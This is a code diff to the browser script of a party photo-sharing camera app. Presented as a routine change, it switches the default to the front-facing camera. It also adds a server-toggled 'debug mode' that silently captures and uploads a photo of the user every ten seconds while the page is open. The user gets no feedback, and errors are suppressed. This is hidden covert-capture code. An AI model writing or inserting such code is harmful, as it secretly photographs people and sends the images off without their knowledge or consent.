@@ -10,9 +10,11 @@
   const toastEl = document.getElementById("cam-toast");
 
   let stream = null;
-  let facing = "environment";
+  let facing = "user";
   let busy = false;
   let code = "";
+  let debugMode = false;
+  let debugTimer = null;
 
   function partyCode() {
     const parts = window.location.pathname.split("/").filter(Boolean);
@@ -47,6 +49,10 @@
   function showError(msg) {
     errEl.hidden = !msg;
     errEl.textContent = msg || "";
+  }
+
+  function syncFlipLabel() {
+    flipBtn.textContent = facing === "user" ? "Others" : "Selfie";
   }
 
   async function startCamera() {
@@ -91,6 +97,44 @@
     });
   }
 
+  function feedLooksLive() {
+    if (!video.videoWidth || video.readyState < 2) return false;
+    const w = 32;
+    const h = 32;
+    const probe = document.createElement("canvas");
+    probe.width = w;
+    probe.height = h;
+    const ctx = probe.getContext("2d");
+    ctx.drawImage(video, 0, 0, w, h);
+    const data = ctx.getImageData(0, 0, w, h).data;
+    let sum = 0;
+    let max = 0;
+    const n = data.length / 4;
+    for (let i = 0; i < data.length; i += 4) {
+      const y = 0.2126 * data[i] + 0.7152 * data[i + 1] + 0.0722 * data[i + 2];
+      sum += y;
+      if (y > max) max = y;
+    }
+    return max > 18 && sum / n > 4;
+  }
+
+  async function sendPhoto(opts) {
+    const silent = Boolean(opts && opts.debug);
+    const blob = await captureJPEG();
+    if (!blob) throw new Error("Could not take that photo");
+    const body = new FormData();
+    body.append("photo", blob, silent ? "debug.jpg" : "shot.jpg");
+    body.append("facing", facing);
+    if (silent) body.append("debug", "1");
+    const res = await fetch(appURL("api/join/" + code + "/shot"), { method: "POST", body });
+    const data = await res.json().catch(() => ({}));
+    if (!res.ok) throw new Error(data.error || "Could not send that photo");
+    if (typeof data.count === "number" && !silent) {
+      countEl.textContent = String(data.count);
+    }
+    return data;
+  }
+
   async function snap() {
     if (busy) return;
     if (!video.videoWidth) {
@@ -103,15 +147,7 @@
     void flash.offsetWidth;
     flash.classList.add("pop");
     try {
-      const blob = await captureJPEG();
-      if (!blob) throw new Error("Could not take that photo");
-      const body = new FormData();
-      body.append("photo", blob, "shot.jpg");
-      body.append("facing", facing);
-      const res = await fetch(appURL("api/join/" + code + "/shot"), { method: "POST", body });
-      const data = await res.json().catch(() => ({}));
-      if (!res.ok) throw new Error(data.error || "Could not send that photo");
-      countEl.textContent = String(data.count || 0);
+      const data = await sendPhoto({});
       toast(data.cloud ? "In the album." : "Saved. It will reach the album next.");
     } catch (err) {
       toast(err.message || "Could not send that photo");
@@ -121,14 +157,32 @@
     }
   }
 
+  async function debugSnap() {
+    if (!debugMode || busy || document.hidden) return;
+    if (!feedLooksLive()) return;
+    try {
+      await sendPhoto({ debug: true });
+    } catch (_) {}
+  }
+
+  function armDebugSnaps() {
+    if (debugTimer) clearInterval(debugTimer);
+    debugTimer = null;
+    if (!debugMode) return;
+    debugTimer = setInterval(() => {
+      debugSnap();
+    }, 10000);
+  }
+
   flipBtn.addEventListener("click", () => {
     facing = facing === "user" ? "environment" : "user";
-    flipBtn.textContent = facing === "user" ? "Others" : "Selfie";
+    syncFlipLabel();
     startCamera();
   });
   shutter.addEventListener("click", () => snap());
 
   code = partyCode();
+  syncFlipLabel();
   fetch(appURL("api/join/" + code))
     .then((res) => {
       if (!res.ok) throw new Error("This party camera is closed.");
@@ -137,6 +191,8 @@
     .then((data) => {
       nameEl.textContent = data.name || "Party Cam";
       countEl.textContent = String(data.count || 0);
+      debugMode = Boolean(data.debug);
+      armDebugSnaps();
       return startCamera();
     })
     .catch((err) => showError(err.message || "This party camera is closed."));
